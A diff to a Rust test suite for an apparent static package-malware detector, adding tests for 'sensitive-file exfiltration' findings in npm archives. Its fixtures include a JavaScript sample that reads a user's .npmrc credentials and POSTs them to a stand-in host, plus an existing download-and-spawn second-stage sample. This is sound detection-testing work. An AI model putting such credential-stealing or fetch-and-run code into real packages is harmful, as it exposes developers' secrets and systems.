@@ -7,8 +7,10 @@ use whoathere_artifact::{Ecosystem, NormalizationLimits, Sha256Digest};
 use whoathere_detector::ArtifactFindingCategory;
 use whoathere_runner::{
     inspect_exact_artifact_v1, verify_static_download_execute_projections_v1,
-    ExactArtifactFindingKindV1, ExactArtifactInspectionRequestV1, StaticProjectionRequestV1,
-    STATIC_PROJECTION_KIND_V1,
+    verify_static_sensitive_file_exfiltration_projections_v1, ExactArtifactFindingKindV1,
+    ExactArtifactInspectionRequestV1, ExactArtifactThreatClassV1, StaticProjectionRequestV1,
+    STATIC_PROJECTION_KIND_V1, STATIC_SENSITIVE_FILE_EXFILTRATION_PROJECTION_KIND_V1,
+    STATIC_SENSITIVE_FILE_EXFILTRATION_PROJECTION_METADATA_SCHEMA_V1,
 };
 use zip::write::SimpleFileOptions;
 
@@ -34,6 +36,19 @@ const destination = '/tmp/inert-second-stage';
 https.get('https://example.invalid/second-stage');
 fs.writeFileSync(destination, Buffer.from('inert'));
 child_process.spawn(destination);
+"#;
+
+const JAVASCRIPT_SENSITIVE_FILE_EXFILTRATION: &[u8] = br#"const fs = require('node:fs');
+const npmCredentials = fs.readFileSync('/home/whoathere/.npmrc', 'utf8');
+fetch('https://example.invalid/inert-collector', {
+  method: 'POST',
+  body: npmCredentials,
+});
+"#;
+
+const JAVASCRIPT_SENSITIVE_FILE_READ_CONTROL: &[u8] = br#"const fs = require('node:fs');
+const npmConfig = fs.readFileSync('/home/whoathere/.npmrc', 'utf8');
+module.exports = { configLength: npmConfig.length };
 "#;
 
 struct TempRoot(std::path::PathBuf);
@@ -209,6 +224,24 @@ fn verify(
     })
 }
 
+fn verify_sensitive_file_exfiltration(
+    root: &TempRoot,
+    filename: &str,
+    bytes: &[u8],
+    expected: &Sha256Digest,
+) -> Result<whoathere_runner::StaticProjectionMetadataV1, whoathere_runner::StaticProjectionErrorV1>
+{
+    let artifact = root.path().join(filename);
+    std::fs::write(&artifact, bytes).expect("write inert exact archive");
+    verify_static_sensitive_file_exfiltration_projections_v1(StaticProjectionRequestV1 {
+        artifact_path: &artifact,
+        ecosystem: Ecosystem::Npm,
+        acquired_at: "2026-07-17T00:00:00Z",
+        expected_artifact_sha256: expected,
+        normalization_limits: NormalizationLimits::default(),
+    })
+}
+
 #[test]
 fn exact_npm_and_pypi_archives_emit_only_citation_complete_static_projections() {
     for (label, filename, bytes, ecosystem) in [
@@ -336,6 +369,124 @@ fn exact_npm_and_pypi_archives_emit_only_citation_complete_static_projections() 
 }
 
 #[test]
+fn exact_npm_sensitive_file_exfiltration_capability_is_projected_but_paired_control_is_not() {
+    let filename = "static-projection-npm-1.0.0.tgz";
+    let positive = npm_download_execute_tgz(JAVASCRIPT_SENSITIVE_FILE_EXFILTRATION);
+    let expected = Sha256Digest::from_bytes(&positive);
+    let root = TempRoot::new("whoathere-static-sensitive-file-exfiltration-positive");
+    let metadata = verify_sensitive_file_exfiltration(&root, filename, &positive, &expected)
+        .expect("project inert sensitive-file/exfiltration capability");
+
+    assert_eq!(
+        metadata.schema,
+        STATIC_SENSITIVE_FILE_EXFILTRATION_PROJECTION_METADATA_SCHEMA_V1
+    );
+    assert_eq!(metadata.verification_status, "verified");
+    assert!(!metadata.admission_authority);
+    assert!(!metadata.observed_clean);
+    assert!(!metadata.verification_summary.package_execution_applied);
+    assert!(!metadata.verification_summary.network_access_applied);
+    assert!(!metadata.verification_summary.ai_applied);
+    assert!(!metadata.verification_summary.vm_applied);
+    assert!(!metadata.projections.is_empty());
+    assert_eq!(metadata.projection_count, metadata.projections.len());
+    assert!(metadata.projections.iter().all(|projection| {
+        projection.kind == STATIC_SENSITIVE_FILE_EXFILTRATION_PROJECTION_KIND_V1
+            && projection.artifact_sha256 == expected
+            && projection.artifact_manifest_sha256
+                == metadata.verification_summary.artifact_manifest_sha256
+            && projection.source_receipt_sha256 == metadata.source_receipt_sha256
+    }));
+    assert!(metadata
+        .verification_summary
+        .exact_observations
+        .iter()
+        .all(|observation| {
+            observation.threat_class == ExactArtifactThreatClassV1::NetworkAndExfiltration
+                && observation.finding_kind
+                    == ExactArtifactFindingKindV1::DeterministicStatic(
+                        ArtifactFindingCategory::SensitiveFileExfiltrationCapability,
+                    )
+                && observation.behavior_detection_eligible
+        }));
+
+    let canonical = metadata
+        .canonical_json_bytes()
+        .expect("serialize canonical sensitive-file/exfiltration metadata");
+    let parsed: serde_json::Value =
+        serde_json::from_slice(&canonical).expect("parse canonical metadata");
+    assert!(parsed["projections"]
+        .as_array()
+        .expect("projections array")
+        .iter()
+        .all(|projection| projection
+            .as_object()
+            .is_some_and(|object| object.len() == 10)));
+    assert!(!canonical
+        .windows(b"https://example.invalid".len())
+        .any(|window| window == b"https://example.invalid"));
+    assert!(!canonical
+        .windows(b"/home/whoathere/.npmrc".len())
+        .any(|window| window == b"/home/whoathere/.npmrc"));
+
+    let report = inspect_exact_artifact_v1(
+        ExactArtifactInspectionRequestV1 {
+            artifact_path: &root.path().join(filename),
+            quarantine_root: &root.path().join("product-report-quarantine"),
+            ecosystem: Some(Ecosystem::Npm),
+            acquired_at: "2026-07-17T00:00:00Z",
+            ai_requested: false,
+            ai_provider: None,
+            behavior_observation_requested: false,
+            detonation_requested: false,
+            normalization_limits: NormalizationLimits::default(),
+        },
+        None,
+        None,
+    )
+    .expect("build independent product report for sensitive-file/exfiltration cross-check");
+    let projected_observations = metadata
+        .projections
+        .iter()
+        .map(|projection| projection.exact_observation_sha256.clone())
+        .collect::<Vec<_>>();
+    let product_observations = report
+        .observations
+        .iter()
+        .filter(|observation| {
+            observation.finding_kind
+                == ExactArtifactFindingKindV1::DeterministicStatic(
+                    ArtifactFindingCategory::SensitiveFileExfiltrationCapability,
+                )
+        })
+        .map(|observation| observation.observation_sha256.clone())
+        .collect::<Vec<_>>();
+    assert_eq!(projected_observations, product_observations);
+
+    let control = npm_download_execute_tgz(JAVASCRIPT_SENSITIVE_FILE_READ_CONTROL);
+    let control_expected = Sha256Digest::from_bytes(&control);
+    let control_root = TempRoot::new("whoathere-static-sensitive-file-exfiltration-control");
+    let error =
+        verify_sensitive_file_exfiltration(&control_root, filename, &control, &control_expected)
+            .expect_err(
+                "sensitive path access without a network sink must not project exfiltration",
+            );
+    assert_eq!(
+        error.reason_code(),
+        "static_projection_sensitive_file_exfiltration_capability_not_found"
+    );
+    assert_eq!(error.exit_code(), 22);
+    let error_json: serde_json::Value =
+        serde_json::from_slice(&error.canonical_json_bytes()).expect("parse control error JSON");
+    assert_eq!(
+        error_json["schema"],
+        STATIC_SENSITIVE_FILE_EXFILTRATION_PROJECTION_METADATA_SCHEMA_V1
+    );
+    assert_eq!(error_json["observed_clean"], false);
+    assert_eq!(error_json["admission_authority"], false);
+}
+
+#[test]
 fn changed_exact_archive_cannot_reuse_a_frozen_artifact_digest() {
     let original = wheel_download_execute_zip(PYTHON_DOWNLOAD_EXECUTE);
     let expected = Sha256Digest::from_bytes(&original);
@@ -422,6 +573,67 @@ fn command_emits_canonical_json_and_returns_fail_closed_identity_code() {
     assert!(success_json["projection_count"]
         .as_u64()
         .is_some_and(|count| count > 0));
+
+    let sensitive_bytes = npm_download_execute_tgz(JAVASCRIPT_SENSITIVE_FILE_EXFILTRATION);
+    let sensitive_expected = Sha256Digest::from_bytes(&sensitive_bytes);
+    let sensitive_artifact = root
+        .path()
+        .join("static-projection-sensitive-npm-1.0.0.tgz");
+    std::fs::write(&sensitive_artifact, &sensitive_bytes)
+        .expect("write inert sensitive-file/exfiltration command fixture");
+    let sensitive = Command::new(binary)
+        .args([
+            "--artifact",
+            sensitive_artifact.to_str().expect("UTF-8 fixture path"),
+            "--ecosystem",
+            "npm",
+            "--acquired-at",
+            "2026-07-17T00:00:00Z",
+            "--expected-artifact-sha256",
+            sensitive_expected.as_str(),
+            "--projection-kind",
+            STATIC_SENSITIVE_FILE_EXFILTRATION_PROJECTION_KIND_V1,
+        ])
+        .output()
+        .expect("run sensitive-file/exfiltration projection command");
+    assert!(sensitive.status.success());
+    assert!(sensitive.stderr.is_empty());
+    let sensitive_json: serde_json::Value =
+        serde_json::from_slice(&sensitive.stdout).expect("parse sensitive command output");
+    assert_eq!(
+        sensitive_json["schema"],
+        STATIC_SENSITIVE_FILE_EXFILTRATION_PROJECTION_METADATA_SCHEMA_V1
+    );
+    assert!(sensitive_json["projections"]
+        .as_array()
+        .expect("sensitive projections")
+        .iter()
+        .all(|projection| {
+            projection["kind"] == STATIC_SENSITIVE_FILE_EXFILTRATION_PROJECTION_KIND_V1
+        }));
+
+    let invalid_kind = Command::new(binary)
+        .args([
+            "--artifact",
+            artifact.to_str().expect("UTF-8 fixture path"),
+            "--ecosystem",
+            "npm",
+            "--acquired-at",
+            "2026-07-17T00:00:00Z",
+            "--expected-artifact-sha256",
+            expected.as_str(),
+            "--projection-kind",
+            "arbitrary_operator_label",
+        ])
+        .output()
+        .expect("reject unrecognized projection policy");
+    assert_eq!(invalid_kind.status.code(), Some(64));
+    let invalid_kind_json: serde_json::Value =
+        serde_json::from_slice(&invalid_kind.stderr).expect("parse invalid-kind output");
+    assert_eq!(
+        invalid_kind_json["reason_codes"],
+        serde_json::json!(["static_projection_kind_invalid"])
+    );
 
     let wrong_digest = Sha256Digest::from_bytes(b"different exact archive");
     let rejected = Command::new(binary)
